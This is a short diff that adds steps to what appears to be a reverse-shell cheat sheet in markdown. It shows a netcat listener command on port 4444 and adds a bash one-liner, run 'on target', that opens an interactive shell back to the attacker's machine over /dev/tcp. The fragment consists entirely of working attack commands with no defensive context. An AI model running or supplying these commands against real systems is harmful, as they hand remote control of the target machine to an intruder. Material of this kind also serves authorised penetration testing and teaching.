@@ -558,3 +558,8 @@ A reverse shell where the target connects back to your machine using bash.
 #### 1. Start listener (your machine)
 ```bash
 nc -lvnp 4444
+```
+#### 2. Run on target
+```bash
+bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
+```
